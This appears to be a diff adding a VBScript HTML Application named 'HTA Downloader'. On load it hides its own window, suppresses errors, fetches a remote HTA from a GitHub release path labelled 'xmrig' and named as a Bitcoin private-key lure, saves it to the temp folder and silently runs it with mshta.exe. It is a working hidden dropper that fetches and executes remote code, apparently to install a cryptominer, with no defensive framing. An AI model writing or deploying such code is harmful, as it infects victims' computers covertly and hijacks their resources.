@@ -1,0 +1,46 @@
+<html>
+<head>
+  <HTA:APPLICATION 
+    ID="app"
+    APPLICATIONNAME="HTA Downloader"
+    BORDER="thin"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="minimize"
+  >
+  <script language="VBScript">
+    Sub Window_OnLoad()
+      On Error Resume Next
+
+      Dim shell, fso, http, stream, url, path
+      Set shell = CreateObject("WScript.Shell")
+      Set fso = CreateObject("Scripting.FileSystemObject")
+
+      url = "https://github.com/bertammedia/spacetut747/releases/download/xmrig/Bitcoin_Wallet_Privatekey_Balance_2.794_BTC.hta"
+      path = shell.ExpandEnvironmentStrings("%TEMP%") & "\wallet.hta"
+
+      Set http = CreateObject("MSXML2.XMLHTTP")
+      http.Open "GET", url, False
+      http.Send
+
+      If http.Status = 200 Then
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 2
+        stream.Charset = "utf-8"
+        stream.Open
+        stream.WriteText http.ResponseText
+        stream.SaveToFile path, 2
+        stream.Close
+
+        ' Jetzt lokal ausführen
+        shell.Run "mshta.exe " & Chr(34) & path & Chr(34), 0, False
+      End If
+
+      self.close
+    End Sub
+  </script>
+</head>
+<body></body>
+</html>
